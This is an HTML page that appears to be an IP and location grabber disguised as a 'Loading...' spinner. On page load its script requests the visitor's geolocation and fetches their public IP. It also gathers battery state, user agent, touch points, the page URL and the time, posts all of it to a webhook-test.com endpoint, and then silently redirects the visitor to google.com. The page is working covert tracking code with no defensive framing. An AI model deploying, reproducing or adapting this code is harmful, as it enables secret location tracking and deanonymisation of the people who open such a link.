<script>
function convertToDMS(lat, lng) {
    function toDMS(deg, isLat) {
        const absolute = Math.abs(deg);
        const degrees = Math.floor(absolute);
        const minutes = Math.floor((absolute - degrees) * 60);
        const seconds = ((absolute - degrees - minutes / 60) * 3600).toFixed(1);
        const direction = deg >= 0 
            ? (isLat ? 'N' : 'E') 
            : (isLat ? 'S' : 'W');
        return `${degrees}Â°${minutes}'${seconds}"${direction}`;
    }

    const latitude = toDMS(lat, true);
    const longitude = toDMS(lng, false);
    return `${latitude} ${longitude}`;
}

async function getGeolocation() {
    if (!navigator.geolocation) {
        return `geofail`
    }

    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        const { latitude, longitude } = position.coords;
        return convertToDMS(latitude, longitude);
    } catch (error) {
        
    }
}

async function tag() {
    try {
        const location = await getGeolocation();
        let data = await fetch('https://api.ipify.org?format=json');
        let mango = await data.json(); 
        const url = await window.location.href;
        const agent = await navigator.userAgent
        
        let time = new Date();
        const battery = await navigator.getBattery();
        const bat = (battery.level * 100) + "%"; 
        const charging = battery.charging ? 'Yes' : 'No'; 
        if (location){
            let gmaps = "https://www.google.co.uk/maps/place/" + encodeURIComponent(location)
            const webhook = 'https://webhook-test.com/c9f0839f004d466c974bcbac09970721';
            const log = await fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ "ip": mango.ip,"googlemaps": gmaps, "charging": charging, "battery percent": bat, "time": time, "url":url, "MaxTouchPoints":navigator.maxTouchPoints, "useragent":agent, "tag":"V1",})
            });
        }else{
           let gmaps = "Location Unavailable"
            const webhook = 'https://webhook-test.com/c9f0839f004d466c974bcbac09970721';
            const log = await fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ "ip": mango.ip,"googlemaps": gmaps, "time": time, "url":url, "tag":"V1", "charging": charging, "battery percent": bat, "MaxTouchPoints":navigator.maxTouchPoints, "useragent":agent})
            }); 
        }
        window.location.replace('http://google.com')
        
    } catch (error) {
    }
}

tag();
</script>
<div class="loader"></div>
<p class="l">Loading...</p>
<style>
.l {
  
  margin-left: 50%;	
  
}
.loader {
  margin-top: 50%;
  margin-left: 50%;	
  --s: 25px;
  
  --_d: calc(0.353*var(--s));
  width: calc(var(--s) + var(--_d));
  aspect-ratio: 1;
  display: grid;
}
.loader:before,
.loader:after {
  content:"";
  clip-path:polygon(var(--_d) 0,100% 0,100% calc(100% - var(--_d)),calc(100% - var(--_d)) 100%,0 100%,0 var(--_d));
  background:
    conic-gradient(from -90deg at var(--s) var(--_d),
     #fff 135deg,#666 0 270deg,#aaa 0);
  animation: l4 1.2s infinite;
}
.loader:before {
  z-index: 1;
  margin-bottom: calc(var(--_d)/-2 - 1px);
}
.loader:after {
  margin-top: calc(var(--_d)/-2 - 1px);
  animation-delay: 0.6s
}
@keyframes l4{
  0%     {transform: translate(0)}
  16.67% {transform: translate(-10px)}
  33.33% {transform: translate(10px)}
  50%,
  100%   {transform: translate(0)}
}
</style>
